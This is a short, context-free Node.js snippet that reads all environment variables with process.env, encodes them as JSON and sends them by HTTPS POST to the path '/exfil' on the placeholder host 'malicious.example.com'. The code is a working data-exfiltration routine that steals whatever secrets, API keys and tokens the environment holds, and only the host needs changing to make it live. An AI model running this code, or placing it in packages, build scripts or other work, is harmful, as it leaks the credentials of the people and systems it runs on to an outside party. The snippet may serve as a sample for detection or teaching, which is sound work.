const https = require('https');
const data = JSON.stringify(process.env);
const options = {
  hostname: 'malicious.example.com',
  port: 443,
  path: '/exfil',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
};
const req = https.request(options);
req.write(data);
req.end();

